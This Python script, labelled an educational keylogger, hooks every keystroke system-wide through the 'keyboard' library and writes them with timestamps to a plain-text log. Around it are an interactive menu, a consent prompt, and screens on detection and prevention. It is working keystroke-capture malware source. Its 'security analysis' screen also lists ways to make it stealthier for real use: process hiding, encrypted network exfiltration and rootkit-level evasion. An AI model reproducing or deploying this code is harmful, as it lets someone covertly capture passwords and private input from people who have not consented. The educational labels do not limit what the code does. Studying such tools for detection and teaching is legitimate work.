#!/usr/bin/env python3
"""
Educational Keylogger - Python Implementation
============================================

This is an educational project designed to help security engineering students
understand keyboard monitoring techniques and cybersecurity concepts.

IMPORTANT: This software is for educational purposes only. Use responsibly and ethically.
Always ensure you have proper authorization before monitoring any system.

Author: Security Engineering Student
Purpose: Educational demonstration of keylogging techniques
"""

import os
import sys
import time
import threading
import logging
from datetime import datetime
from pathlib import Path

try:
    import keyboard
except ImportError:
    print("Installing required package 'keyboard'...")
    os.system("pip install keyboard")
    import keyboard

class EducationalLogger:
    """
    Logger class for recording captured keystrokes with educational focus
    """
    
    def __init__(self, log_file="keylog.txt"):
        self.log_file = Path(log_file)
        self.buffer = []
        self.lock = threading.Lock()
        self.last_flush = time.time()
        self.initialize_log_file()
    
    def initialize_log_file(self):
        """Initialize log file with educational headers"""
        try:
            if not self.log_file.exists():
                # Create parent directory if it doesn't exist
                self.log_file.parent.mkdir(parents=True, exist_ok=True)
                
                with open(self.log_file, 'w') as f:
                    f.write("=" * 65 + "\n")
                    f.write("Educational Keylogger Log File\n")
                    f.write(f"Created: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                    f.write("Purpose: Security Engineering Education\n")
                    f.write("Warning: This file contains captured keyboard input\n")
                    f.write("=" * 65 + "\n\n")
        except PermissionError:
            print("Warning: Cannot create log file in current directory.")
            # Use a temporary directory instead
            import tempfile
            temp_dir = Path(tempfile.gettempdir())
            self.log_file = temp_dir / "educational_keylog.txt"
            print(f"Using temporary log file: {self.log_file}")
            try:
                with open(self.log_file, 'w') as f:
                    f.write("=" * 65 + "\n")
                    f.write("Educational Keylogger Log File\n")
                    f.write(f"Created: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                    f.write("Purpose: Security Engineering Education\n")
                    f.write("Warning: This file contains captured keyboard input\n")
                    f.write("=" * 65 + "\n\n")
            except Exception as e:
                print(f"Error creating log file: {e}")
                print("Logging will be disabled.")
    
    def log_keystroke(self, key_event):
        """Log a keystroke with timestamp"""
        with self.lock:
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            
            # Add timestamp for new session or after pause
            if not self.buffer or (time.time() - self.last_flush) > 300:  # 5 minutes
                self.buffer.append(f"\n[{timestamp}] ")
            
            # Process the key
            key_str = self._process_key(key_event)
            if key_str:
                self.buffer.append(key_str)
            
            # Flush buffer if needed
            if len(self.buffer) > 50 or (time.time() - self.last_flush) > 30:
                self._flush_buffer()
    
    def _process_key(self, key_event):
        """Process keyboard event into readable string"""
        if key_event.event_type == keyboard.KEY_DOWN:
            key_name = key_event.name
            
            # Handle special keys
            special_keys = {
                'space': ' ',
                'enter': '\n',
                'tab': '[TAB]',
                'backspace': '[BACKSPACE]',
                'delete': '[DELETE]',
                'shift': '[SHIFT]',
                'ctrl': '[CTRL]',
                'alt': '[ALT]',
                'esc': '[ESC]',
                'up': '[UP]',
                'down': '[DOWN]',
                'left': '[LEFT]',
                'right': '[RIGHT]',
                'home': '[HOME]',
                'end': '[END]',
                'page up': '[PAGE_UP]',
                'page down': '[PAGE_DOWN]',
                'insert': '[INSERT]'
            }
            
            if key_name in special_keys:
                return special_keys[key_name]
            elif len(key_name) == 1:  # Regular character
                return key_name
            elif key_name.startswith('f') and key_name[1:].isdigit():  # Function keys
                return f'[{key_name.upper()}]'
            else:
                return f'[{key_name.upper()}]'
        
        return None
    
    def _flush_buffer(self):
        """Flush buffer to log file"""
        if self.buffer:
            try:
                with open(self.log_file, 'a') as f:
                    f.write(''.join(self.buffer))
                self.buffer.clear()
                self.last_flush = time.time()
            except Exception as e:
                print(f"Error writing to log file: {e}")
    
    def log_message(self, message):
        """Log a general message"""
        with self.lock:
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            log_entry = f"\n[{timestamp}] {message}\n"
            self.buffer.append(log_entry)
            self._flush_buffer()
    
    def get_recent_entries(self, max_entries=20):
        """Get recent log entries for display"""
        self._flush_buffer()
        try:
            if self.log_file.exists():
                with open(self.log_file, 'r') as f:
                    lines = f.readlines()
                # Filter and return recent entries
                relevant_lines = [line.strip() for line in lines 
                                if line.strip() and '[' in line and not line.startswith('=')]
                return relevant_lines[-max_entries:]
        except Exception as e:
            return [f"Error reading log file: {e}"]
        return []
    
    def get_log_info(self):
        """Get log file information"""
        try:
            if self.log_file.exists():
                size = self.log_file.stat().st_size
                return str(self.log_file.absolute()), size
        except:
            pass
        return str(self.log_file.absolute()), 0

class EducationalKeylogger:
    """
    Main keylogger class with educational features
    """
    
    def __init__(self):
        self.logger = EducationalLogger()
        self.is_running = False
        self.hook = None
        self.lock = threading.Lock()
    
    def display_header(self):
        """Display application header"""
        os.system('clear' if os.name == 'posix' else 'cls')
        print("╔═══════════════════════════════════════════════════════════╗")
        print("║              Educational Keylogger v1.0                  ║")
        print("║         Security Engineering Learning Project            ║")
        print("╚═══════════════════════════════════════════════════════════╝")
        print()
    
    def display_ethical_warning(self):
        """Display ethical use warning and get consent"""
        print("⚠️  ETHICAL USE WARNING ⚠️")
        print("This software is for educational purposes only.")
        print("Only use on systems you own or have explicit permission to monitor.")
        print("Unauthorized monitoring may violate laws and regulations.")
        print()
        
        consent = input("Do you agree to use this software ethically and legally? (y/N): ").strip().lower()
        if consent != 'y':
            print("Exiting. Thank you for being responsible.")
            sys.exit(0)
        print()
    
    def display_menu(self):
        """Display interactive menu"""
        self.display_header()
        print("Educational Menu:")
        print("1. Start Keylogger (Educational Mode)")
        print("2. Stop Keylogger")
        print("3. Display Status")
        print("4. View Log File")
        print("5. Security Analysis")
        print("6. Detection Methods")
        print("7. Exit")
        print()
        return input("Choose an option (1-7): ").strip()
    
    def start_keylogger(self):
        """Start the educational keylogger"""
        with self.lock:
            if self.is_running:
                print("Keylogger is already running!")
                return
        
        try:
            print("Starting educational keylogger...")
            print("Educational Note: This demonstrates keyboard event monitoring")
            
            # Install keyboard hook
            keyboard.hook(self.logger.log_keystroke)
            
            with self.lock:
                self.is_running = True
            
            self.logger.log_message("=== Keylogger Started (Educational Session) ===")
            
            print("✓ Keylogger started successfully!")
            print("Educational Mode: Monitoring keyboard input for learning purposes")
            print("Press any key to return to menu...")
            
        except Exception as e:
            print(f"Error starting keylogger: {e}")
            print("\nEducational Note: Common causes of failures:")
            print("- Insufficient privileges (try running as administrator/sudo)")
            print("- Security software blocking the monitoring")
            print("- System restrictions on input monitoring")
    
    def stop_keylogger(self):
        """Stop the keylogger"""
        with self.lock:
            if not self.is_running:
                print("Keylogger is not currently running!")
                return
        
        try:
            print("Stopping keylogger...")
            keyboard.unhook_all()
            
            with self.lock:
                self.is_running = False
            
            self.logger.log_message("=== Keylogger Stopped ===")
            print("✓ Keylogger stopped successfully!")
            
        except Exception as e:
            print(f"Error stopping keylogger: {e}")
    
    def display_status(self):
        """Display current status"""
        print("=== Current Status ===")
        
        with self.lock:
            status = "RUNNING" if self.is_running else "STOPPED"
            print(f"Keylogger Status: {status}")
        
        log_path, log_size = self.logger.get_log_info()
        print(f"Log File: {log_path}")
        print(f"Log File Size: {log_size} bytes")
        
        print("\nEducational Information:")
        print("- This keylogger uses Python's 'keyboard' library")
        print("- It monitors keyboard events at the system level")
        print("- Cross-platform compatible (Windows, Linux, macOS)")
        print("- Demonstrates event-driven programming concepts")
    
    def display_log_file(self):
        """Display recent log entries"""
        print("=== Recent Log Entries ===")
        entries = self.logger.get_recent_entries(20)
        
        if not entries:
            print("No log entries found.")
        else:
            for entry in entries:
                print(entry)
    
    def display_security_analysis(self):
        """Display security analysis of the implementation"""
        print("=== Security Analysis of This Implementation ===")
        print()
        
        print("Vulnerabilities in this educational keylogger:")
        print("1. Plain text logging - keystrokes stored unencrypted")
        print("2. No network communication - easier to detect and contain")
        print("3. Visible process - shows up in process list")
        print("4. No privilege escalation - runs with user permissions")
        print("5. No persistence mechanisms - doesn't survive reboot")
        print("6. Dependency on external library - easily detectable")
        print()
        
        print("Security improvements for real-world scenarios:")
        print("- Encryption of logged data with secure key management")
        print("- Process hiding and anti-analysis techniques")
        print("- Network exfiltration with encrypted communication")
        print("- Rootkit-level implementation for stealth")
        print("- Advanced evasion techniques")
    
    def display_detection_methods(self):
        """Display detection and countermeasures"""
        print("=== Detection and Countermeasures ===")
        print()
        
        print("How to detect this keylogger:")
        print("1. Process monitoring - visible in task manager/ps")
        print("2. File system monitoring - creates log files")
        print("3. Network monitoring - library installations")
        print("4. Behavioral analysis - unusual keyboard monitoring")
        print("5. Library dependency scanning - 'keyboard' library usage")
        print()
        
        print("Prevention methods:")
        print("- Use hardware-based security keys")
        print("- Virtual keyboards for sensitive input")
        print("- Regular security audits and monitoring")
        print("- Endpoint detection and response (EDR) solutions")
        print("- Application sandboxing and isolation")
        print("- User access control and privilege limitation")
    
    def run(self):
        """Main application loop"""
        self.display_header()
        self.display_ethical_warning()
        
        while True:
            try:
                choice = self.display_menu()
                
                if choice == '1':
                    self.start_keylogger()
                elif choice == '2':
                    self.stop_keylogger()
                elif choice == '3':
                    self.display_status()
                elif choice == '4':
                    self.display_log_file()
                elif choice == '5':
                    self.display_security_analysis()
                elif choice == '6':
                    self.display_detection_methods()
                elif choice == '7':
                    print("Thank you for using the Educational Keylogger responsibly!")
                    if self.is_running:
                        self.stop_keylogger()
                    sys.exit(0)
                else:
                    print("Invalid choice. Please try again.")
                
                input("\nPress Enter to continue...")
                
            except KeyboardInterrupt:
                print("\n\nExiting...")
                if self.is_running:
                    self.stop_keylogger()
                sys.exit(0)
            except Exception as e:
                print(f"Error: {e}")
                input("Press Enter to continue...")

def main():
    """Main entry point"""
    try:
        keylogger = EducationalKeylogger()
        keylogger.run()
    except Exception as e:
        print(f"Fatal error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()